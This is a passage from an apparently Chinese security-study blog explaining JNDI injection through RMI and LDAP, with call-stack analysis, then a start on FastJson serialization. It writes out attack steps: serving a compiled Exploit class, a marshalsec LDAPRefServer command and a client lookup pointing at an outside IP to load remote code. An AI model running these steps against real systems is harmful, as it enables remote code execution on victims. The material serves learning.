class="string">&quot;Exploit&quot;</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="å—å®³è€…-JNDIå®¢æˆ·ç«¯"><a href="#å—å®³è€…-JNDIå®¢æˆ·ç«¯" class="headerlink" title="å—å®³è€… JNDIå®¢æˆ·ç«¯"></a>å—å®³è€… JNDIå®¢æˆ·ç«¯</h6><p>å¯ä»¥é€šè¿‡<code>Properties</code>è®¾ç½®ç¯å¢ƒå˜é‡</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> JNDI.RMI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDIClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        Properties env = <span class="keyword">new</span> Properties();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY,<span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);</span><br><span class="line">        env.put(Context.PROVIDER_URL,<span class="string">&quot;rmi://127.0.0.1:1099/&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Context context = <span class="keyword">new</span> InitialContext(env);</span><br><span class="line">        context.lookup(<span class="string">&quot;Exploit&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>æ‰€ä»¥æ”»å‡»æµç¨‹åº”è¯¥æ˜¯ä¼ å…¥æ¶æ„çš„RMI URLç»™å®¢æˆ·ç«¯ï¼Œé€šè¿‡lookupè¿æ¥åˆ°ç”±æˆ‘ä»¬æ§åˆ¶çš„æ³¨å†Œä¸­å¿ƒï¼Œè·å–åˆ°æ¶æ„çš„Referenceï¼Œç„¶åè§£æReferenceè·å–ç›¸åº”çš„æˆ‘ä»¬å†™å…¥çš„æ¶æ„çš„Factoryç±»ä»è€Œå®ç°rce</p>
</blockquote>
<h6 id="è§£ææµç¨‹"><a href="#è§£ææµç¨‹" class="headerlink" title="è§£ææµç¨‹"></a>è§£ææµç¨‹</h6><p>è°ƒç”¨æ ˆï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getObjectFactoryFromReference:160, NamingManager</span><br><span class="line">getObjectInstance:319, NamingManager</span><br><span class="line">decodeObject:464, RegistryContext</span><br><span class="line">â€¦â€¦</span><br><span class="line">lookup:-1, RegistryImpl_Stub</span><br><span class="line">lookup:118, RegistryContext</span><br><span class="line">lookup:128, RegistryContext</span><br><span class="line">lookup:417, InitialContext</span><br><span class="line">main:15, JNDIClient</span><br></pre></td></tr></table></figure>

<p>åœ¨<code>InitialContext</code>ä¸­å·²ç»å°†æˆ‘ä»¬è®¾ç½®çš„å˜é‡æ”¾åˆ°äº†å¯¹åº”çš„å˜é‡ä¸­</p>
<p><img src="https://img-blog.csdnimg.cn/b97ec99e73314415bbd6ff491c6d1999.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>åœ¨<code>InitialContext#lookup</code>ä¸­ä¼šè°ƒç”¨åˆ°<code>defaultInitCtx#lookup</code>ï¼Œä»è€Œè°ƒç”¨äº†<code>RegistryContext#lookup</code>ï¼Œä¹‹åå°±æ˜¯æ ¹æ®æˆ‘ä»¬åˆå§‹åŒ–çš„å†…å®¹è¿›å…¥åˆ°æ³¨å†Œä¸­å¿ƒé€šè¿‡<code>RegistryImpl_Stub#lookup</code>è·å–æ³¨å†Œä¸­å¿ƒä¸­<code>Name</code>æ‰€å¯¹åº”çš„å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯<code>referenceWrapper</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Remote <span class="title">lookup</span><span class="params">(String var1)</span> <span class="keyword">throws</span> AccessException, NotBoundException, RemoteException </span>&#123; <span class="comment">// var1 = Exploit</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        RemoteCall var2 = <span class="keyword">super</span>.ref.newCall(<span class="keyword">this</span>, operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ObjectOutput var3 = var2.getOutputStream();</span><br><span class="line">            var3.writeObject(var1); <span class="comment">// è¿›è¡Œåºåˆ—åŒ– å› ä¸ºRMIåº•å±‚æ˜¯ç±»åºåˆ—åŒ–çš„å€¼çš„ä¼ é€’</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var18) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> MarshalException(<span class="string">&quot;error marshalling arguments&quot;</span>, var18);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">super</span>.ref.invoke(var2);</span><br><span class="line"></span><br><span class="line">        Remote var23;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ObjectInput var6 = var2.getInputStream();</span><br><span class="line">            var23 = (Remote)var6.readObject(); <span class="comment">// Remote</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var15) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> UnmarshalException(<span class="string">&quot;error unmarshalling return&quot;</span>, var15);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException var16) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> UnmarshalException(<span class="string">&quot;error unmarshalling return&quot;</span>, var16);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">super</span>.ref.done(var2);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> var23;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException var19) &#123;</span><br><span class="line">        <span class="keyword">throw</span> var19;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RemoteException var20) &#123;</span><br><span class="line">        <span class="keyword">throw</span> var20;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NotBoundException var21) &#123;</span><br><span class="line">        <span class="keyword">throw</span> var21;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var22) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> UnexpectedException(<span class="string">&quot;undeclared checked exception&quot;</span>, var22);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¹‹åé€šè¿‡<code>RegistryContext#decodeObject</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">decodeObject</span><span class="params">(Remote var1, Name var2)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Object var3 = var1 <span class="keyword">instanceof</span> RemoteReference ? ((RemoteReference)var1).getReference() : var1;</span><br><span class="line">        <span class="keyword">return</span> NamingManager.getObjectInstance(var3, var2, <span class="keyword">this</span>, <span class="keyword">this</span>.environment);</span><br><span class="line">    &#125; â€¦â€¦</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/84fa1cf7b69647b18c30d27682db4285.png" alt="img"></p>
<p>ç„¶ååœ¨<code>NamingManager#getObjectInstance</code>ä¸­æ ¹æ®Referenceè·å–Factory</p>
<p><img src="https://img-blog.csdnimg.cn/904a183a7b1947589f00d36a38f295f3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>è¿™é‡Œcodebaseçš„å€¼å°±æˆäº†æˆ‘ä»¬ä¼ è¿›å»çš„å¸¦æœ‰æ¶æ„ç±»çš„url</p>
<p><img src="https://img-blog.csdnimg.cn/0c74cec9f88d4b4fbcc8321a9e523321.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>ä¹‹åé€šè¿‡<code>loadClass</code>å¯¹ç±»è¿›è¡ŒåŠ è½½ï¼Œè¿è¡Œäº†Exploitä¸­çš„é™æ€ä»£ç å®ç°RCE</p>
<p><img src="https://img-blog.csdnimg.cn/746812b0c5954c9cae50937006c06e87.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<h4 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h4><blockquote>
<p>ä½¿ç”¨èŒƒå›´æ›´å¹¿</p>
<p>éœ€è¦ï¼šcom.sun.jndi.ldap.object.trustURLCodebase ä¸º true ï¼Œ JDK 11.0.1 ã€ 8u191 ã€ 7u201 ã€ 6u211 å¼€å§‹é»˜è®¤ä¸º false </p>
</blockquote>
<p>æ”»å‡»æµç¨‹ï¼š</p>
<blockquote>
<ol>
<li>æ”»å‡»è€…ä¸ºæ˜“å—æ”»å‡»çš„JNDI lookupæä¾›äº†ä¸€ä¸ª<strong>ç»å¯¹çš„</strong>LDAP URL</li>
<li>æœåŠ¡å™¨è¿æ¥åˆ°ç”±æ”»å‡»è€…æ§åˆ¶çš„LDAPæœåŠ¡å™¨ï¼Œè¯¥æœåŠ¡å™¨è¿”å›æ¶æ„JNDI  Reference</li>
<li>æœåŠ¡å™¨è§£ç JNDI Reference</li>
<li>æœåŠ¡å™¨ä»æ”»å‡»è€…æ§åˆ¶çš„æœåŠ¡å™¨è·å–Factoryç±»</li>
<li>æœåŠ¡å™¨å®ä¾‹åŒ–Factoryç±»ï¼Œå®ç°RCE</li>
</ol>
</blockquote>
<p>ç”¨marshalsecå¼€ä¸€ä¸ªæœåŠ¡ï¼Œå°†Exploitç±»ç¼–è¯‘ä¹‹åæ”¾åˆ°vpsä¸Šï¼Œç„¶åç”¨pythonåœ¨å¯¹åº”çš„ç›®å½•ä¸‹å¼€å¯æœåŠ¡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server --bind 0.0.0.0 8000 </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &#x27;http://82.156.2.166:8888/#Exploit&#x27; 9000</span><br></pre></td></tr></table></figure>

<p>å®¢æˆ·ç«¯ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> JNDI.RMI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.RegistryContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDIClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        Context context = <span class="keyword">new</span> InitialContext();</span><br><span class="line">    context.lookup(<span class="string">&quot;ldap://82.156.2.166:9000/Exploit&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/c108fdc536a74721a697ccf127512c20.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<h4 id="å·¥å…·è¿ç”¨"><a href="#å·¥å…·è¿ç”¨" class="headerlink" title="å·¥å…·è¿ç”¨"></a>å·¥å…·è¿ç”¨</h4><p>å¯ä»¥åˆ©ç”¨å·¥å…·æ­å»ºæœåŠ¡ç«¯</p>
<h5 id="marshalsec"><a href="#marshalsec" class="headerlink" title="marshalsec"></a>marshalsec</h5><p><a href="https://github.com/mbechler/marshalsec">marshalsec</a></p>
<p>å‘½ä»¤æ ¼å¼ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp target/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.&lt;Marshaller&gt; [-a] [-v] [-t] [&lt;gadget_type&gt; [&lt;arguments...&gt;]]</span><br></pre></td></tr></table></figure>

<p>RMI:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:8888/#ExportObject 1099</span><br></pre></td></tr></table></figure>

<p>LDAP:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &#x27;http://127.0.0.1:8888/#Exploit&#x27; 9000</span><br></pre></td></tr></table></figure>

<p>â€¦â€¦</p>
<h4 id="å°ç»“-1"><a href="#å°ç»“-1" class="headerlink" title="å°ç»“"></a>å°ç»“</h4><blockquote>
<p> FaIth4444å¸ˆå‚…çš„æ€»ç»“</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/723174794616450390c12d3f10f834fa.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<h3 id="Reference-1"><a href="#Reference-1" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://govuln.com/">ä»£ç å®¡è®¡æ˜Ÿçƒ</a></p>
<p><a href="https://www.cnblogs.com/cute-puli/p/14373826.html">å°‘èµ°å¼¯è·¯ä¹‹marshalsecçš„ç¼–è¯‘ï¼ˆRMIå¿…å¤‡å·¥å…·ï¼‰ - é“ºå“© - åšå®¢å›­ (cnblogs.com)</a></p>
<p><a href="https://www.freebuf.com/articles/web/317622.html">https://www.freebuf.com/articles/web/317622.html</a></p>
<p><a href="https://paper.seebug.org/1091/#jndildap">https://paper.seebug.org/1091/#jndildap</a></p>
<p><a href="https://blog.csdn.net/whatday/article/details/107942941">https://blog.csdn.net/whatday/article/details/107942941</a></p>
]]></content>
      <categories>
        <category>æ²¡æœ‰äººæ¯”æˆ‘æ›´çˆ±å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>åºåˆ—åŒ–</tag>
        <tag>CC1</tag>
        <tag>RMI</tag>
        <tag>æ¸…æ˜èŠ‚ä¹Ÿæ²¡äººèƒ½é˜»æ­¢æˆ‘å­¦ä¹ </tag>
      </tags>
  </entry>
  <entry>
    <title>Javaåˆæ­¥å­¦ä¹ â…£</title>
    <url>/2022/04/15/Java%E5%88%9D%E6%AD%A5%E5%AD%A6%E4%B9%A0%E2%85%A3/</url>
    <content><![CDATA[<blockquote>
<p>FastJsonå…¥é—¨å•¦~  æŒç»­æ›´æ–°ä¸­</p>
</blockquote>
<h2 id="FastJsonå…¥é—¨"><a href="#FastJsonå…¥é—¨" class="headerlink" title="FastJsonå…¥é—¨"></a>FastJsonå…¥é—¨</h2><p>Fastjsonæ˜¯Alibabaç»´æŠ¤çš„å¼€æºJSONè§£æåº“ï¼Œå…¶ä¼˜åŠ¿æ˜¯â€å¿«â€ã€‚å®ƒå¯ä»¥è§£æ JSON æ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œâ½€æŒå°† Java Bean åºåˆ— åŒ–ä¸º JSON å­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥ä»JSONå­—ç¬¦ä¸²ååºåˆ—åŒ–åˆ° Java Bean ã€‚</p>
<p><a href="https://github.com/alibaba/fastjson">alibaba/fastjson</a></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.83<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p><code>vsersion: 1.2.24</code></p>
<h3 id="åºåˆ—åŒ–"><a href="#åºåˆ—åŒ–" class="headerlink" title="åºåˆ—åŒ–"></a>åºåˆ—åŒ–</h3><ul>
<li><strong>Json.toJSONString</strong></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> FastJson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String Id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">char</span> sex;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> score;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Demo</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Demo&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.Id = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">this</span>.name = <span class="string">&quot;ameuu&quot;</span>;</span><br><span class="line">        <span class="keyword">this</span>.sex = <span class="string">&#x27;F&#x27;</span>;</span><br><span class="line">        <span class="keyword">this</span>.score = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getId&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> Id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">char</span> <span class="title">getSex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getSex&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getScore</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getScore&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> score;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(String id)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setId&quot;</span>);</span><br><span class="line">        Id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">char</span> sex)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setSex&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setScore</span><span class="params">(<span class="keyword">int</span> score)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setScore&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.score = score;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Demo&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;Id=&#x27;&quot;</span> + Id + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, sex=&quot;</span> + sex +</span><br><span class="line">                <span class="string">&quot;, score=&quot;</span> + score +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="éè‡ªçœ"><a href="#éè‡ªçœ" class="headerlink" title="éè‡ªçœ"></a>éè‡ªçœ</h4><p><code>JSON.toJSONString()</code>|<code>JSON.toJSON</code>ï¼Œåœ¨åºåˆ—åŒ–çš„æ—¶å€™ä¼šè‡ªåŠ¨è°ƒç”¨æ„é€ å‡½æ•°ä»¥åŠå„ç§getå‡½æ•°</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> FastJson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Serialize</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Demo demo = <span class="keyword">new</span> Demo();</span><br><span class="line">        String res = JSON.toJSONString(demo);</span><br><span class="line">        </span><br><span class="line">        System.out.println(res); <span class="comment">// &#123;&quot;id&quot;:&quot;1&quot;,&quot;name&quot;:&quot;ameuu&quot;,&quot;score&quot;:0,&quot;sex&quot;:&quot;F&quot;&#125;</span></span><br><span class="line">        System.out.println(JSON.toJSON(demo)); <span class="comment">// &#123;&quot;score&quot;:0,&quot;sex&quot;:&quot;F&quot;,&quot;name&quot;:&quot;ameuu&quot;,&quot;id&quot;:&quot;1&quot;&#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="è‡ªçœ"><a href="#è‡ªçœ" class="headerlink" title="è‡ªçœ"></a>è‡ªçœ</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Serialize</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Demo demo = <span class="keyword">new</span> Demo();</span><br><span class="line">        System.out.println(JSON.toJSONString(demo, SerializerFeature.WriteClassName));</span><br><span class="line"><span class="comment">//        &#123;&quot;@type&quot;:&quot;FastJson.Demo&quot;,&quot;id&quot;:&quot;1&quot;,&quot;name&quot;:&quot;ameuu&quot;,&quot;score&quot;:0,&quot;sex&quot;:&quot;F&quot;&#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h3><p>åœ¨ä¸€å¼€å§‹è‡ªå·±å°è¯•çš„æ—¶å€™å‘ç°ï¼š</p>
<p><code>Demo demo = (Demo)JSON.parse(serialize);</code>ä¼šæŠ¥é”™</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Deserialize</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String serialize = <span class="string">&quot;&#123;\&quot;id\&quot;:\&quot;1\&quot;,\&quot;name\&quot;:\&quot;ameuu\&quot;,\&quot;score\&quot;:0,\&quot;sex\&quot;:\&quot;F\&quot;&#125;&quot;</span>;</span><br><span class="line">        Object demo = JSON.parse(serialize);</span><br><span class="line">        JSONObject demo1 = JSON.parseObject(serialize);</span><br><span class="line">        System.out.println(demo1); <span class="comment">// è¾“å‡ºå‡ºæ¥ä¹Ÿåªæ˜¯ä¸€ä¸²å­—ç¬¦ä¸² å¹¶æ²¡æœ‰è°ƒç”¨toString</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å…ˆè·å–ä»–çš„<code>Class</code>ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ä¸€å¼€å§‹å¹¶æ²¡æœ‰çœŸæ­£å¾—è·å–åˆ°æˆ‘ä»¬åŸæœ¬çš„å¯¹è±¡ï¼Œç„¶ååœ¨ç¬¬ä¸‰ä¸ªæ–¹æ³•è·å¾—æˆ‘ä»¬çš„å¯¹è±¡çš„æ—¶å€™ä¼šè‡ªåŠ¨è°ƒç”¨æ„é€ å‡½æ•°å¹¶ä¸”setter</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Deserialize</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String serialize = <span class="string">&quot;&#123;\&quot;id\&quot;:\&quot;1\&quot;,\&quot;name\&quot;:\&quot;ameuu\&quot;,\&quot;score\&quot;:0,\&quot;sex\&quot;:\&quot;F\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="comment">// JSON.parse Class = class com.alibaba.fastjson.JSONObject</span></span><br><span class="line">        System.out.println(<span class="string">&quot;JSON.parse Class = &quot;</span>+JSON.parse(serialize).getClass());</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// JSON.parseObject Class = class com.alibaba.fastjson.JSONObject</span></span><br><span class="line">        System.out.println(<span class="string">&quot;JSON.parseObject Class = &quot;</span>+JSON.parseObject(serialize).getClass());</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// JSON.parseObject(String,Class) Class = class FastJson.Demo</span></span><br><span class="line">        System.out.println(<span class="string">&quot;JSON.parseObject(String,Class) Class = &quot;</span> +JSON.parseObject(serialize,Demo.class).getClass());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯å°±æ¯”å¦‚åºåˆ—åŒ–ä¸­å­˜åœ¨çš„è‡ªçœï¼Œå¦‚æœå­—ç¬¦ä¸²å‰é¢æœ‰<code>@type</code>ï¼Œå‰é¢ä¸¤ä¸ªæ–¹æ³•ä¹Ÿæ˜¯å¯ä»¥ç›´æ¥è·å¾—åŸæœ¬çš„å¯¹è±¡çš„ï¼Œè€Œç¬¬ä¸€ç§åœ¨è¾“å‡ºçš„æ—¶å€™ä¼šç›´æ¥è°ƒç”¨toStringæ–¹æ³•ï¼Œè€Œç¬¬äºŒç§æ–¹æ³•è™½ç„¶è¾“å‡ºçš„æ—¶å€™è¿˜æ˜¯ä¼šè¾“å‡º<code>com.alibaba.fastjson.JSONObject</code>ï¼Œä½†æ˜¯ä¼šè°ƒç”¨setterå’Œgetter</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Deserialize</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String serialize = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;FastJson.Demo\&quot;,\&quot;id\&quot;:\&quot;1\&quot;,\&quot;name\&quot;:\&quot;ameuu\&quot;,\&quot;score\&quot;:0,\&quot;sex\&quot;:\&quot;F\&quot;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;JSON.parse Class = &quot;</span>+JSON.parse(serialize));</span><br><span class="line">        System.out.println(<span class="string">&quot;JSON.parseObject Class = 